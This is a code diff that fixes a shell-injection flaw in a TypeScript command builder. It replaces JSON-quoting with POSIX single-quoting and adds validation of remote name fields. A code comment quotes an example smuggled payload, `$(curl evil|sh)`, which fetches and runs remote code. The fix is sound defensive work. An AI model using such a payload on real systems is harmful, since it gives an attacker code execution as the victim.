@@ -59,13 +59,65 @@ export function parseServeAddress(link: string): ServeTarget | null {
 }
 
 /**
- * The placed card's command: JSON-quoted argv, no shell (a pane may exec argv
- * without one), no payment state (a reference is supplied interactively in the
- * live line, never persisted into node data).
+ * POSIX single-quoting — the ONLY safe way to put a value in this command.
+ *
+ * A terminal's command IS run through a shell: DirectMultiplexer spawns
+ * `$SHELL -l -c <command>` and tmux wraps it in `sh -c`. JSON.stringify was
+ * used here first and is NOT sufficient: it escapes " and \ but leaves $ and
+ * ` live inside the resulting double quotes, so a served door answering with
+ * `{"name": "Team $(curl evil|sh)"}` executed that as the owner, unsandboxed,
+ * the moment the card was placed. Single quotes have no expansions at all;
+ * the only escape needed is for the quote itself.
+ */
+function shellQuote(value: string): string {
+  return `'${value.replaceAll("'", `'\\''`)}'`
+}
+
+/**
+ * A name is remote, attacker-controlled data. Even with quoting airtight, it
+ * is displayed, persisted and passed as argv, so it is bounded and stripped of
+ * control characters here — one narrow shape, refused rather than mangled.
+ */
+export function safeFaceName(name: unknown): string | null {
+  if (typeof name !== 'string') return null
+  const trimmed = name.trim()
+  if (trimmed.length === 0 || trimmed.length > 64) return null
+  // eslint-disable-next-line no-control-regex
+  if (/[\x00-\x1F\x7F]/.test(trimmed)) return null
+  return trimmed
+}
+
+/** The face a served door answered with, validated before anything uses it. */
+export function validateFace(value: unknown): ImportFace | null {
+  if (typeof value !== 'object' || value === null) return null
+  const raw = value as Record<string, unknown>
+  const name = safeFaceName(raw.name)
+  const door = safeFaceName(raw.door)
+  if (name === null || door === null) return null
+  if (raw.access !== 'account' && raw.access !== 'paid') return null
+  const serviceId = typeof raw.serviceId === 'string' ? raw.serviceId.slice(0, 128) : ''
+  const slug = typeof raw.slug === 'string' ? raw.slug.slice(0, 128) : ''
+  const priceUsd = typeof raw.priceUsd === 'string' ? raw.priceUsd.slice(0, 32) : undefined
+  return {
+    name,
+    serviceId,
+    slug,
+    door,
+    access: raw.access,
+    ...(priceUsd !== undefined ? { priceUsd } : {}),
+    version: Number.isFinite(raw.version) ? (raw.version as number) : 1,
+    agents: Number.isFinite(raw.agents) ? (raw.agents as number) : 0
+  }
+}
+
+/**
+ * The placed card's command. Every value is shell-quoted (see shellQuote — the
+ * command runs through a shell), and no payment state is present: a reference
+ * is supplied interactively in the live line, never persisted into node data.
  */
 export function orchLineCommand(script: string, target: ServeTarget, name: string): string {
   const args = [script, '--origin', target.origin, '--slug', target.slug, '--name', name]
-  return `node ${args.map((value) => JSON.stringify(value)).join(' ')}`
+  return `node ${args.map(shellQuote).join(' ')}`
 }
 
 /**
